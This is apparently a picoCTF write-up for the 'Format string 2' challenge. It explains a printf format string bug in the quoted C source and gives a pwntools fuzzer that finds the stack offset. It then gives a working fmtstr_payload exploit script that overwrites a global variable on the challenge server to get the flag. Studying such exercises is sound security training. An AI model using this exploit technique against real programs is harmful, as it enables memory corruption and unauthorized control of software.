---
title: "Format string 2"
date: "2025-07-18"
tags: ["picoCTF", "format string"]
---

# Format String 2

In this exercise we have a binary and its C source.

```c
./vuln                    
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
hola
Here's your input: hola
sus = 0x21737573
You can do better!   
```

The program prints back whatever we type and shows the value of the `sus` variable.

Looking at the code we can see our input is handled in an unsafe way, with no format specifier, and that gives us a format string vulnerability.

```c
scanf("%1024s", buf);
printf("Here's your input: ");
printf(buf); // Vulnerabilidad Format String
```

Thanks to that we can print whatever is on the stack.

The win condition is setting the `sus` variable to this value:

```c
if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
}
```

There does not seem to be any other vulnerability, so the idea is to change the value of `sus` with the format string bug. To do that we need two things:

1. The memory address of the variable we want to change.
2. The offset on the stack where our input lands.

To get the address of `sus` we can use the `p &sus` command in `dbg`:

```c
pwndbg> p &sus
$5 = (<data variable, no debug info> *) 0x404060 <sus>
```

Now that we have the address, all that is left is the position of our input on the stack. We can use a fuzzer for that:

```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)

for i in range(100):
    try:
        p = process(level='error')
        p.sendlineafter(b'?', 'ABCDEF%{}$x'.format(i).encode())
        result = p.recvuntil(b'!')
        print(str(i) + ': ' + str(result))
        p.close()
    except EOFError:
        pass
```

Looking at the output we see this:

```
13: b"\nHere's your input: ABCDEF0\nsus = 0x21737573\nYou can do better!"
14: b"\nHere's your input: ABCDEF44434241\nsus = 0x21737573\nYou can do better!" // Aquí
15: b"\nHere's your input: ABCDEF782435\nsus = 0x21737573\nYou can do better!"
```

At position 14 we get `44434241`, which in ASCII is:

```bash
pwn unhex 44434241           
DCBA
```

And if we remember, the fuzzer was sending this:

```python
p.sendlineafter(b'?', 'ABCDEF%{}$x'.format(i).encode())
```

So our input starts at position 14 of the stack.

With that we can use the `fmtstr_payload` function, passing it what it needs to change the `sus` variable and get the flag:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("rhea.picoctf.net", 49373)
    return r

def main():
    r = conn()

    offset = 14  # Posición del input en el stack
    direccion_sus = exe.symbols['sus']  # Dirección de 'sus'
    valor = {direccion_sus: 0x67616c66}  # Valor objetivo para 'sus'
    
    payload = fmtstr_payload(offset, valor, write_size='byte')
    
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()
```
